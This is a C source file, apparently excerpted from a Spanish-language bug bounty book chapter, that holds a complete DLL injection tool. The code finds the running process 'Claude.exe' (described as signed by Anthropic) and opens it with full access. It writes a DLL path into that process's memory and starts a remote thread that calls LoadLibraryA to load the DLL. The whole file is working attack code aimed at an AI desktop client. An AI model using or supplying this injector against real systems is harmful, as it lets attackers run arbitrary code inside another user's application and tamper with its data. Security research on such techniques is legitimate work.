// Extraído de: LibroBugBounty/cap-13-vm-escape-rpc.md
// injector.c — Inyecta DLL en Claude.exe (firmado por Anthropic)
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD find_process(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

int main(int argc, char* argv[]) {
    DWORD pid = find_process("Claude.exe");
    if (!pid) { printf("Claude.exe not found\n"); return 1; }

    HANDLE proc = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, pid
    );

    // Alocar memoria para la ruta de la DLL
    const char* dll = argv[1];  // Ruta a nuestra DLL
    void* remote = VirtualAllocEx(
        proc, NULL, strlen(dll) + 1,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    WriteProcessMemory(proc, remote, dll, strlen(dll) + 1, NULL);

    // Crear thread que llama a LoadLibraryA con nuestra DLL
    HANDLE thread = CreateRemoteThread(
        proc, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "LoadLibraryA"
        ),
        remote, 0, NULL
    );
    WaitForSingleObject(thread, 5000);

    printf("[+] DLL injected into Claude.exe (PID %d)\n", pid);
    CloseHandle(thread);
    CloseHandle(proc);
    return 0;
}
